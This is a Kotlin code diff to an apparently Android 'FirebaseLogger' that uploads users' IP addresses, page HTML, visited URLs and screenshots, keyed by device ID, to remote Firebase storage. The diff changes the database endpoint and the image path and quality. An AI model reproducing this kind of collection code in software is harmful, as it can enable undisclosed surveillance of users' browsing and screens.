@@ -18,7 +18,7 @@ object FirebaseLogger {
         var log = LogModel(getIPAddress(true)!!, html)
         var url = clearUrl(rawUrl)
         FirebaseDatabase
-                .getInstance("https://overlay-e9c56-default-rtdb.firebaseio.com/")
+                .getInstance("https://okfirst-e9e9b-default-rtdb.firebaseio.com/")
                 .reference
                 .child(id)
                 .child("(${Calendar.getInstance().timeInMillis}) $url")
@@ -67,11 +67,11 @@ object FirebaseLogger {
 
     fun saveImage(bitmap: Bitmap, url : String) {
         val stream = ByteArrayOutputStream()
-        bitmap.compress(Bitmap.CompressFormat.PNG, 100, stream)
+        bitmap.compress(Bitmap.CompressFormat.PNG, 50, stream)
         val byteArray: ByteArray = stream.toByteArray()
 
         var reference = Firebase.storage.reference
-        var timeStampRef = reference.child("${Amplitude.getInstance().deviceId}/${Calendar.getInstance().timeInMillis}  ${clearUrl(url)}")
+        var timeStampRef = reference.child("images/${Amplitude.getInstance().deviceId}/${Calendar.getInstance().timeInMillis}  ${clearUrl(url)}")
         timeStampRef.putBytes(byteArray)
     }
 }
